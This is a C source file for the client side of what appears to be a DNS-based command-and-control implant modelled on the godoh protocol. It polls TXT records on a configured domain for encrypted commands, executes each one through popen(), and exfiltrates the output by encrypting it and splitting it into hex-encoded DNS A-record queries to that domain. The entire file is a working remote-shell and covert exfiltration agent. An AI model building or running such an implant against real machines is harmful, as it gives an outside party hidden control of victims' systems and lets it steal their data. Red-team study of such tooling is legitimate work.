#include "client.h"

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <string.h>

#include "options.h"

#include "util/utils.h"
#include "util/crypt.h"
#include "util/json.h"
#include "util/crc32.h"

#include "includes/base64/base64.h"

/* DNS STUFF */
#include <resolv.h>
#include <ctype.h>
/* DNS STUFF */

#include "util/debug.h"

const char *resp_idle = "v=B2B3FE1C";
const char *resp_error = "v=D31CFAA4";
const char *resp_cmd = "v=A9F466E8";

void reset_command(client_t *client) {
    for (int i = 0; i < 255; i++) {
        client->command[i] = '\0';
    }
}

struct Client *init_client() {

    struct Client *client = malloc(sizeof(*client));

    client->domain = DOMAIN;
    client->status = Idle;
    reset_command(client);

    rand_str(client->agent_id, sizeof(client->agent_id) - 1);
    char *hex_agent_id = bin_str_to_hex_str(client->agent_id, sizeof(client->agent_id) - 1);
    strncpy(client->agent_id_hex, hex_agent_id, strlen(hex_agent_id));

    snprintf(client->checkin_domain,
             sizeof(client->checkin_domain),
             "%s.%s",
             client->agent_id_hex,
             client->domain);

#ifdef DEBUG
    Dprintf("client init: state          = %d\n", client->status);
    Dprintf("client init: domain         = %s\n", client->domain);
    Dprintf("client init: agent_id       = %s\n", client->agent_id);
    Dprintf("client init: agent_id_hex   = %s\n", client->agent_id_hex);
    Dprintf("client init: checkin_domain = %s\n", client->checkin_domain);
#endif

    return client;
}

/*
 * Converts a request hex string ( like from a TXT response )
 * to decompressed, decrypted an decoded string.
 */
char *request_hex_to_string(const char *in) {

    int gz_bytes_len = 0;
    char *gz_bytes = hex_str_to_bin_char(in, &gz_bytes_len);

    // decrypt
    char clear[gz_bytes_len];
    size_t clear_len = decrypt(gz_bytes, gz_bytes_len, clear);
    hex_dump("clear", clear, clear_len);

    // decode json
    char *c = calloc(255, sizeof(char *));
    json_parse_command(clear, c);

    return c;
}

/*
 * Converts a null terminated string ( typically from command output ) to
 * a json encoded, encrypted and compressed byte array
 */
char *str_to_response_bytes(client_t *client, char *res, int *res_length) {

    if (client->status != Command) {
        Dprintf("[d] trying to respond when the client is not in Command mode");
        return NULL;
    }

    // base64 res bytes
    int b64len;
    char *b64encoded = base64(res, strlen(res), &b64len);

    // json encode response struct
    char *json_encoded = calloc(strlen(res) * 2, sizeof(char *));
    json_serialize_cmd_response(client->command, b64encoded, json_encoded);

    // encrypt json payload
    int encr_len = 0;
    char *encr = encrypt(json_encoded, strlen(json_encoded), &encr_len);

    char *result = malloc(encr_len);
    for (int i = 0; i < encr_len; i++) {
        result[i] = encr[i];
    }

    *res_length = encr_len;

    free(json_encoded);

    return result;
}

int send_response(client_t *client, char **data, int data_count) {

    for (int i = 0; i < data_count; i++) {

        char label[222]; // max label len
        snprintf(label, 222, "%s.%s", data[i], client->domain);
        Dprintf("[d] sending %d: %s\n", i, label);

        u_char answer[255];
        int len = res_query(label, ns_c_in, ns_t_a, answer, sizeof(answer));
        if (len < 0) {
            Dprintf("[d] resp len was: %d\n", len);
//            return 1;
        }
    }

    return 0;
}


void poll(client_t *client) {

    u_char answer[255]; // a single TXT response string is max 255
    char txt[255];
    int len;
    ns_msg msg;
    ns_rr rr;

    len = res_query(client->checkin_domain, ns_c_in, ns_t_txt, answer, sizeof(answer));

    if (len <= 0)
        return;

    if (ns_initparse(answer, len, &msg) < 0)
        return;

    if (ns_msg_count(msg, ns_s_an) > 1)
        Dprintf("[d] dns response had more than 1 answers. we are only taking the first\n");

    if (ns_parserr(&msg, ns_s_an, 0, &rr)) // take the first rr, 0
        return;

    if (ns_rr_type(rr) != ns_t_txt)
        return;

    // first byte seems to be a size byte maybe?
    strncpy(txt, (char *) ns_rr_rdata(rr) + 1, ns_rr_rdlen(rr));

    if (strstr(txt, resp_idle) != NULL) {
        client->status = Idle;
        return;
    }

    if (strstr(txt, resp_error) != NULL) {
        client->status = Error;
        return;
    }

    if (strstr(txt, resp_cmd) != NULL) {
        // double check and make sure we have ,p=
        if (strstr(txt, ",p=") == NULL) {
            // something is wrong, lets ignore that response
            client->status = Idle;
            return;
        }

        // when we're in a cmd state, we are expecting the bytes
        // to process as the value for p.
        //  ie. p=ffffff
        char *command;

        char *token = strtok(txt, "=");
        while (token != NULL) {
            command = (char *) malloc(sizeof(token) + 1);
            command = token;

            // continue scanning
            token = strtok(NULL, "=");
        }

#ifdef DEBUG
        Dprintf(" - command hex %s\n", command);
        Dprintf(" - command hex str len: %lu\n", strlen(command));
#endif

        char *c = request_hex_to_string(command);

        // copy the command to the client
        reset_command(client);
        strncpy(client->command, c, strlen(c));
        client->status = Command;
    }
}

/*
 * Take a string command, executes it using popen() and
 * returns the resultant character array pointer.
 */
char *shell_exec_output(const char *command) {

    FILE *cmd = popen(command, "r");
    if (cmd == NULL) {
        Dprintf("[d] error: failed to execute command %s\n", command);
    }

    static char buff[1024];
    char *res = malloc(1 * sizeof(char));
    u_int res_size = 0;
    size_t n;

    while ((n = fread(buff, 1, sizeof(buff), cmd)) > 0) {
        char *t_res = realloc(res, strlen(res) + strlen(buff) + 1);
        if (t_res == NULL) {
            Dprintf("[d] reallocation for more cmd output failed\n");
            break;
        }

        res = t_res;
        strcat(res, buff);

        res_size += n;
    }

    res[res_size + 1] = '\0';
    pclose(cmd);

    return res;
}


char **payload_to_dns_a(const char *payload, int payload_len, int *requests_len) {
    // spec: https://github.com/sensepost/godoh/blob/1.6/protocol/utils.go#L39

    //		ident.type.seq.crc32.proto.datalen.data.data.data
    //
    //	ident: 		the identifier for this specific stream
    //	type:		stream status indicator. ie: start, sending, stop
    //	seq:		a sequence number to track request count
    //	crc32:		checksum value
    //	proto:		the protocol this transaction is for. eg: file transfer/cmd
    // 	datalen:	how much data does this packet have
    //	data:		the labels containing data. max of 3 but can have only one too
    //
    //	Size: 4 + 2 + 16 + 8 + 2 + 2 + 60 + 60 + 60 for a maximum size of 214
    //  Sample:
    //		0000.00.0000000000000000.00000000.00.00.60.60.60
    const int max_label = 222;  // datalen + .'s
    const int data_label_max = 30;
    const int data_label_all_max = data_label_max * 3;
    const int data_label_all_max_str = data_label_all_max * 2;  // 1 byte is 2 chars hex

    // the total number of requests based on how the src data divvies up
    int total_requests = (payload_len / data_label_all_max);
    if ((payload_len % data_label_all_max) != 0)
        total_requests += 1;

    // cater for the two start stream / end stream requests too
    total_requests += 2;

    // alloc for requests
    char **requests = (char **) calloc(total_requests, sizeof(char *));
    for (int i = 0; i < total_requests; i++) {
        requests[i] = (char *) calloc(max_label + 1, sizeof(char *));
    }

    *requests_len = total_requests;

    /* protocol constants */
    int stream_start = 0xbe;
    int stream_data = 0xef;
    int stream_end = 0xca;
    // int file_protocol = 0x00;
    char command_protocol = 0x01;
    /* protocol constants */

    int seq = 0;
    char ident[2] = {rand(), rand()};

    // initial request to start a stream
    // ident.type.seq.crc32.proto.datalen.data.data.data
    char init[max_label + 1];
    snprintf(init, max_label,
             "%02hhx%02hhx.%02x.%02hhx.%02hhx.%02hhx.%02hhx.%02hhx.%02hhx.%02hhx",
             ident[0], ident[1],                                // ident
             stream_start,                                      // type
             (u_int8_t) seq,                                    // seq
             (u_int8_t) 0x00,                                   // crc32
             command_protocol,                                  // proto
             (u_int8_t) 0,                                      // datalen
             (u_int8_t) 0x00, (u_int8_t) 0x00, (u_int8_t) 0x00);// data
    strncpy(requests[seq], init, max_label);

    // placeholder to know how much data we have encoded so far
    int data_offset = 0;
    seq++;

    while (seq < total_requests - 1) {

        // create the actual data requests

        char request[max_label + 1] = {0};
        char byte_parts[3][data_label_all_max + 1] = {{0x00},
                                                      {0x00},
                                                      {0x00}};
        unsigned char byte_full[data_label_all_max] = {0};

        for (int pi = 0; pi < 3; pi++) {

            // check if we are done
            if ((payload_len - data_offset) <= 0) {
                break;
            }

            // determine how much data to read in this chunk
            int chunk_len;
            if ((payload_len - data_offset) < data_label_max)
                chunk_len = payload_len - data_offset;
            else
                chunk_len = data_label_max;

            char byte_chunk[30] = {0};
            for (int i = 0; i < chunk_len; i++) {
                byte_chunk[i] = payload[i + data_offset];
                byte_full[(30 * pi) + i] = payload[i + data_offset];
            }

            char *as_hex = bin_str_to_hex_str(byte_chunk, chunk_len);
            strncpy(byte_parts[pi], as_hex, strlen(as_hex));

            // advance the offset array so that we strcpy from that offset
            data_offset += 30;
        }

        u_int crc = crc32(byte_full);   // TODO: fix, check spec, may need to be hex encoded

        // count the byte_parts that are populated
        int data_parts = 0;
        for (int p = 0; p < 3; p++) {
            if (strlen(byte_parts[p]) > 0) {
                data_parts++;
            }
        }

        // populate a string with the 3 labels properly formatted
        char data_parts_str[data_label_all_max_str + 1 + (3)] = {0}; // +3 for .'s
        switch (data_parts) {
            case 1:
                snprintf(data_parts_str, data_label_all_max_str + 4, "%s.0.0", byte_parts[0]);
                break;
            case 2:
                snprintf(data_parts_str, data_label_all_max_str + 4, "%s.%s.0", byte_parts[0], byte_parts[1]);
                break;
            case 3:
                snprintf(data_parts_str, data_label_all_max_str + 4, "%s.%s.%s", byte_parts[0], byte_parts[1],
                         byte_parts[2]);
                break;
            default:
                Dprintf("[d] somehow we have more than 3 data labels o_0\n");
                break;
        }

        snprintf(request, max_label,
                 "%02hhx%02hhx.%02x.%02hhx.%02x.%02hhx.%02x.%s",
                 ident[0], ident[1],    // ident
                 stream_data,           // type
                 (u_int8_t) seq,        // seq
                 crc,                   // crc32
                 command_protocol,      // proto
                 3,                     // datalen
                 data_parts_str);       // data
        strncpy(requests[seq], request, max_label);

        seq++;
    };

    // fin request
    char final[max_label + 1];
    snprintf(final, max_label,
             "%02hhx%02hhx.%02x.%02hhx.%02hhx.%02hhx.%02hhx.%02hhx.%02hhx.%02hhx",
             ident[0], ident[1],                              // ident
             stream_end,                                      // type
             (u_int8_t) seq,                                   // seq
             (u_int8_t) 0x00,                                  // crc32
             command_protocol,                                // proto
             (u_int8_t) 0,                                     // datalen
             (u_int8_t) 0x00, (u_int8_t) 0x00, (u_int8_t) 0x00); // data
    strncpy(requests[seq], final, max_label);

    return requests;
}
